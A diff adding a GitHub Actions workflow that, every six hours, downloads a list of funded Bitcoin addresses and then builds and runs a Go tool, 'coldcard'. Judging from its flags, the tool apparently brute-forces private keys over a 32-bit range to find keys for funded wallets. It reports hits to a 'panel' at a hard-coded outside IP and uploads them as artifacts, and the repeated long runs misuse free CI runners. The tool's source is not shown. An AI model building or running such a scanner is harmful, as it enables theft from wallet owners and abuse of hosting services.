@@ -1,0 +1,40 @@
+name: cold
+on:
+  push:
+    paths: ['.github/cold-trigger.txt']
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    env:
+      PANEL_URL: http://43.228.157.68:80
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-go@v4
+        with:
+          go-version: '1.21'
+      - name: Download UTXO
+        run: wget -q "http://addresses.loyce.club/blockchair_bitcoin_addresses_and_balance_LATEST.tsv.gz" -O utxo_raw.tsv.gz
+      - name: Build
+        run: |
+          mkdir coldrun && cp utxo_raw.tsv.gz coldrun/ && cp main.go coldrun/
+          cd coldrun
+          go mod init coldcard_onefile
+          go get github.com/bits-and-blooms/bloom/v3@v3.7.1
+          go get github.com/btcsuite/btcd/btcec/v2@v2.5.0
+          go get golang.org/x/crypto@v0.21.0
+          go mod tidy && go build -o coldcard .
+      - name: Scan
+        run: |
+          cd coldrun
+          ./coldcard -max 4294967295 -addr 20 -hits hits.txt -rand -panel "$PANEL_URL" 2>&1 | tail -5 || true
+      - name: Upload hits
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: hits-${{ github.run_id }}
+          path: coldrun/hits.txt
+          if-no-files-found: ignore
